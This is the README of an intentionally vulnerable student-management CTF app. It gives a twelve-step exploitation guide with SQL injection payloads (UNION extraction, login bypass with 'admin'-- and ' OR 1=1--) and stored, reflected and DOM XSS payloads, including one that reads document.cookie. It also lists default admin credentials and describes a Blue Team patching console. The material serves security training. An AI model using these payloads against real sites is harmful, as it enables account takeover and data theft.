# CampusCare CTF

Welcome to the CampusCare CTF Environment! This application looks like a typical student management system, but it is intentionally vulnerable to a wide array of web attacks. The goal is to act as a Red Team and exploit these vulnerabilities directly from your browser. 

**No source code access is required to exploit this application.** All attacks can be executed using input fields, URL manipulation, and browser DevTools.

## Exploitation Guide

### 1. SQL Injection: Search Bar (`UNION` Based)
**Location:** `/search` -> Search input field
**Vulnerability:** The search query (`q`) is interpolated directly into the backend SQL query without parameterization.
**Exploit:**
Type the following into the search box to break out of the query and union the `flags` table into the results:
```sql
%' UNION SELECT flag_value,flag_name,difficulty,points,hint FROM flags--
```
**Result:** The search results table will dynamically map all columns and display the injected flag data alongside normal user records.

### 2. SQL Injection: Login Auth Bypass
**Location:** `/login` -> Username field
**Vulnerability:** The login endpoint `POST /api/auth/login` uses raw string interpolation for the username check.
**Exploit:**
Type the following into the Username field (Password can be anything):
```sql
admin'--
```
**Result:** The `--` comments out the password verification in the SQL statement, allowing you to log in as the admin without knowing their password.

### 3. Stored XSS: Notice Board (Admin Posting)
**Location:** `/admin` -> Post New Notice panel (requires admin JWT)
**Vulnerability:** Notice titles and content are stored as-is and rendered using `dangerouslySetInnerHTML` on the `/notices` and `/dashboard` pages.
**Exploit:** 
Once logged in as an admin (or by forging an admin JWT), create a new notice with the following content:
```html
<script>alert('Stored XSS on Notice Board!')</script>
```
or
```html
<img src=x onerror=alert(document.cookie)>
```
**Result:** Any user who visits the `/notices` page or views the Notice widget on the `/dashboard` will execute the payload.

### 4. Reflected XSS: Search Query
**Location:** `/search`
**Vulnerability:** The `q` URL parameter is reflected back to the user without sanitization when displaying "Found X records for '...'" via `dangerouslySetInnerHTML`.
**Exploit:** 
Navigate to the following URL:
```text
/search?q=<img src=x onerror=alert('Reflected XSS')>
```
**Result:** The image tag will fail to load, triggering the `onerror` event handler and popping the alert box immediately.

### 5. Stored XSS: Profile Name
**Location:** `/profile/[id]`
**Vulnerability:** User profile names are rendered directly as HTML. If an attacker manages to create or alter an account with an HTML payload in their name, it will trigger on profile view.
**Exploit:**
(Assuming the ability to register/modify a user account) Set the `full_name` to:
```html
<img src=x onerror=alert('Profile XSS')>
```
**Result:** When anyone visits that user's profile (`/profile/[id]`), the payload will execute.

### 6. SQL Injection: Profile ID (Blind/Error)
**Location:** `/profile/[id]` (API Endpoint: `/api/profile/[id]`)
**Vulnerability:** The `id` parameter from the URL path is passed directly into a raw SQL query.
**Exploit:** 
Navigate to a manipulated URL to trigger a database error or extract data:
```text
/profile/0 UNION SELECT id, username, email, full_name, class, section, admission_no, role FROM users WHERE role='admin'
```
*(Note: Because of how the UI parses this, observing the network tab for `debug_query` or raw DB errors is easiest here).*

### 7. Stored XSS: Assignment Submissions
**Location:** `/assignments/submissions?studentId=[id]`
**Vulnerability:** The custom frontend submissions page fetches and displays student submission `content` and teacher `feedback` using `dangerouslySetInnerHTML`.
**Exploit:** 
Submit an assignment (or modify an existing one in the DB) with the content:
```html
<svg/onload=alert('Submission XSS')>
```
**Result:** When an admin (or any user exploiting IDOR via the `studentId` param) views the submission page, the script executes.

### 8. SQL Injection: Search Class Filter
**Location:** `/search`
**Vulnerability:** The class filter dropdown sets a `class` parameter in the URL which is passed raw to the backend query.
**Exploit:** 
Intercept the request or manually modify the URL parameter:
```text
/search?class=X' UNION SELECT ... --
```
**Result:** Operates identically to the Search Bar SQLi but abuses a different parameter.

### 9. DOM-based XSS: Notice Board Filter Hash
**Location:** `/notices`
**Vulnerability:** The page reads `window.location.hash`, decodes it, and assigns it directly to `.innerHTML` of a display element.
**Exploit:** 
Share the following link with a victim:
```text
/notices#<img src=x onerror=alert('DOM XSS')>
```
**Result:** The browser processes the hash strictly on the client side, bypassing server-side WAFs, and writes the malicious tag directly into the DOM.

### 10. Stored XSS: Dashboard Bulletins
**Location:** `/dashboard`
**Vulnerability:** The dashboard renders recent notice titles using `dangerouslySetInnerHTML`.
**Exploit:** 
Post a notice with a malicious title (similar to Vuln 3).
**Result:** The payload fires as soon as a user logs in and loads their dashboard.

### 11. SQL Injection: Auth Bypass via OR
**Location:** `/login` -> Username field
**Vulnerability:** Secondary payload for the auth bypass vulnerability.
**Exploit:** 
Type the following into the Username field:
```sql
' OR 1=1--
```
**Result:** Forces the `WHERE` clause to evaluate to true for the first record in the `users` table, typically logging you in as the system administrator without a password.

### 12. Reflected XSS: Login Error Output
**Location:** `/login`
**Vulnerability:** If a login attempt fails, the error message reflects the username you provided using `dangerouslySetInnerHTML` to bold the username string.
**Exploit:** 
Attempt to log in with a username containing HTML:
```html
<img src=x onerror=alert('Login Error XSS')>
```
**Result:** The login fails, and the UI attempts to display "Login failed for user '<img...>'", triggering the XSS payload.

---

## Blue Team Defense Dashboard

In addition to the Red Team experience, CampusCare features a fully gamified **Blue Team Defense Console** that allows defenders to detect, acknowledge, and patch vulnerabilities in real-time.

### Accessing the Dashboard
Log in as an administrator (e.g., username `admin`, password `admin123`) and navigate to the **Defense Console** via the sidebar, or go directly to `/defense`.

### Features
- **Real-Time Log Feed:** Watch simulated attacks and your own red-team exploits appear in the log feed in real-time. Critical severity events trigger visual alarms.
- **Threat Inspector:** Click on any event to inspect the raw payload, source IP, and HTTP metadata.
- **Two-Step Remediation Flow:**
  1. **Acknowledge Threat:** Triages the event and awards initial points (+40 pts).
  2. **Fix Vulnerability Code:** Opens the **IDE Modal**.
- **Integrated IDE Modal:** When fixing a vulnerability, a code editor overlays the screen. 
  - It provides a description of the flaw.
  - Features a **Multi-File Tab Layout** so players must explore both frontend (e.g., `page.tsx`) and backend (e.g., `route.ts`) code to locate the vulnerability.
  - Players can edit the code, use the hint system if stuck, and deploy the fix.
- **Instant Patch Enforcement:** Once a vulnerability is marked as patched in the IDE, the fix is instantly enforced across the entire application via a high-speed local polling mechanism. The vulnerable routes will automatically block the exploit payload and display a green `🛡️ PATCHED` banner to any attackers attempting to exploit that specific vector.

---
**Happy Hacking (and Defending)!** Remember to use Incognito mode if testing session-destroying payloads.